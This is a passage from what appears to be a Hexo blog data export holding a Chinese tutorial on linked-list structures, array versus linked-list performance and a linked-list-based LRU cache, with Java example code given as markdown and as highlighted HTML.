node){\n        final T element = node.val;\n        head.next = head.next.next;\n        node.next = null;\n        node.val = null;\n        size--;\n        return element;\n    }\n\n    // 单链表反转\n    public void reverse(){\n        // 链表为空或者链表只有一个元素时\n        if (head.next == null || size <=1 ){\n            return;\n        }\n        Node<T> p = head.next;\n        Node<T> q = p.next;\n        Node<T> r;\n        p.next = null;\n        while (q !=null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        head.next = p;\n    }\n\n    public int size(){\n        return size;\n    }\n\n    // 打印链表 example: [1, 2, 3]\n    @Override\n    public String toString() {\n        if (head.next == null){\n            return \"[]\";\n        }\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        Node<T> p = head.next;\n        while (p.next!=null){\n            sb.append(p.val).append(\", \");\n            p = p.next;\n        }\n        sb.append(p.val).append(\"]\");\n        return sb.toString();\n    }\n\n    public static class Node<T>{\n        private T val;\n        private Node<T> next;\n        Node(T val){\n            this.val = val;\n        }\n    }\n}\n```\n\n基于链表的LRU缓存代码：\n```java\npublic interface LRUCache<T> {\n    void put(T val);\n\n    T get(T val);\n\n    int Size();\n}\n\nclass ListLRUCache<T> implements LRUCache<T> {\n    private SinglyLinkedList<T> lruList;\n    private static final int DEFAULT_CAP=10;\n\n    // 缓存容量\n    private int cap;\n    // 缓存使用大小\n    private int size;\n\n    public ListLRUCache(){\n        this(DEFAULT_CAP);\n    }\n    public ListLRUCache(int cap){\n        this.cap = cap;\n        this.lruList = new SinglyLinkedList<>();\n    }\n\n    @Override\n    public void put(T value) {\n        // 1、缓存满了\n        // 如果该列表中没有该数据\n        if (size == cap){\n            // 1、缓存满了\n            // 删除最后一个节点\n            lruList.delete(size-1);\n            // 将该数据插入到链表头部\n            lruList.push(value);\n        }else {\n            // 2、缓存未满\n            // 直接在列表头部插入该数据\n            lruList.push(value);\n            size++;\n        }\n    }\n\n    @Override\n    public T get(T val) {\n        T result = null;\n        if (lruList.contains(val)){\n            // 在list中,从list中获取该数据\n            int index = lruList.indexOf(val);\n            result = lruList.get(index);\n            System.out.println(\"从缓存中获取\");\n            // 将该节点插入到链表头部\n            lruList.delete(index);\n            lruList.push(val);\n        }else{\n            // 如果该列表中没有该数据\n            System.out.println(\"缓存中没有该数据！\");\n            if (size == cap){\n                // 1、缓存满了\n                // 删除最后一个节点\n                lruList.delete(size-1);\n                // 将该数据插入到链表头部\n                lruList.push(val);\n                System.out.println(\"缓存已满！将该数据插入到缓存\");\n            }else {\n                // 2、缓存未满\n                // 直接在列表头部插入该数据\n                lruList.push(val);\n                size++;\n                System.out.println(\"将该数据直接插入到缓存\");\n            }\n            // 如果有数据库，该数据从数据库中获取\n            result = val;\n        }\n\n        return result;\n    }\n\n    public int Size(){\n        return size;\n    }\n}\n```\n\n字符串是否是回文字符串：\n```java\n\n```\n\n<br>","slug":"算法-链表","published":1,"updated":"2019-06-26T03:52:03.528Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2nq006ho25tlcxfois3","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。</p>\n<p>缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。</p>\n<p>缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。</p>\n<p>今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表及其结构\"><a href=\"#链表及其结构\" class=\"headerlink\" title=\"链表及其结构\"></a>链表及其结构</h3></div><br></div>\n\n<p>相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。</p>\n<p>我们先从<strong>底层存储结构</strong>来看一下二者的区别：</p>\n<p>为了直观的对比，我画了一张图，从图中可以看到，<strong>数组需要一块连续的内存空间来存储</strong>，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。</p>\n<p>而链表恰恰相反，它并不需要一块连续的内存空间，他<strong>通过“指针”将一组零散的内存块连接起来</strong>使用，所以申请一块大小是100MB的链表，根本不会有问题。</p>\n<img src=\"/posts/2018-09-12-算法-链表/数组与链表结构对比.jpg\" title=\"数组与链表结构对比\">\n<p>链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。</p>\n<h4 id=\"单链表\"><a href=\"#单链表\" class=\"headerlink\" title=\"单链表\"></a>单链表</h4><p>首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“<strong>结点</strong>”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做<strong>后继指针 next</strong>。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表.jpg\">\n<p>从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为<strong>头结点</strong>，最后一个节点称为<strong>尾结点</strong>。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。</p>\n<p>与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。</p>\n<p>为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表插入删除.jpg\">\n<p>但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。</p>\n<p>你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。</p>\n<p>好了，单链表了解了，下面来看看另外两个复杂的链表：<strong>循环链表和双向链表</strong>。</p>\n<h4 id=\"循环链表\"><a href=\"#循环链表\" class=\"headerlink\" title=\"循环链表\"></a>循环链表</h4><p><strong>循环链表是一种特殊的单链表</strong>。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。</p>\n<img src=\"/posts/2018-09-12-算法-链表/循环链表.jpg\">\n<p>和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。</p>\n<h4 id=\"双线链表\"><a href=\"#双线链表\" class=\"headerlink\" title=\"双线链表\"></a>双线链表</h4><p>接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：<strong>双向链表</strong>。</p>\n<p>单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向链表.jpg\">\n<p>从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？</p>\n<p>从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。</p>\n<p>你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。</p>\n<p>我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：</p>\n<ul>\n<li>删除结点中“值等于某个给定值的”结点</li>\n<li>删除给定指针指向的结点</li>\n</ul>\n<p>对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。</p>\n<p>尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。</p>\n<p>对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p-&gt;next = q，说明p是q的前驱结点。</p>\n<p>但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！</p>\n<p>同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。</p>\n<p>除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。</p>\n<p>现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。</p>\n<p>实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。</p>\n<p>还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。</p>\n<p>所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？</p>\n<p>了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：<strong>双向循环链表</strong>。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向循环链表.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表-VS-数组性能大比拼\"><a href=\"#链表-VS-数组性能大比拼\" class=\"headerlink\" title=\"链表 VS 数组性能大比拼\"></a>链表 VS 数组性能大比拼</h3></div><br></div>\n\n<p>通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。</p>\n<table>\n<thead>\n<tr>\n<th>时间复杂度</th>\n<th>数组</th>\n<th>链表</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>插入删除</td>\n<td>O(n)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>随机访问</td>\n<td>O(1)</td>\n<td>O(n)</td>\n</tr>\n</tbody>\n</table>\n<p>不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。</p>\n<p>数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。</p>\n<p>数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。</p>\n<p>你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。</p>\n<p>我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。</p>\n<p>除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。</p>\n<p>所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？</p>\n<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。</p>\n<ol>\n<li><p>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。</p>\n</li>\n<li><p>如果此数据没有缓存在链表中，又可以分为两种情况：</p>\n<ul>\n<li>如果此时缓存未满，则将此结点直接插入到链表的头部；</li>\n<li>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</li>\n</ul>\n</li>\n</ol>\n<p>这样我们就实现了一个LRU缓存，是不是很简单。</p>\n<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。</p>\n<p>实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。</p>\n<p>基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。</p>\n<p>和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<p><br></p>\n<p>本章代码：<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">GitHub</a></p>\n<p>带头单链表代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.NoSuchElementException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SinglyLinkedList</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; head;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SinglyLinkedList</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.head = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 链表头部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkFirst</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        newNode.next = head.next;</span><br><span class=\"line\">        head.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 链表尾部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p=p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取头部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoSuchElementException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head.next.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取尾部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getLast</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 添加</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 在某处索引插入</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> index, T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        Node&lt;T&gt; p = node(index);</span><br><span class=\"line\">        insert(p, newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">insert</span><span class=\"params\">(Node&lt;T&gt; p, Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span> &amp;&amp; q.next!=p)&#123;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (q == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        newNode.next = p;</span><br><span class=\"line\">        q.next = newNode;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据值删除某个节点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">delete</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; !p.next.val.equals(val))&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next== <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = p.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 根据索引删除某结点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">delete</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; deleteNode = node(index);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> deleteNode(deleteNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span 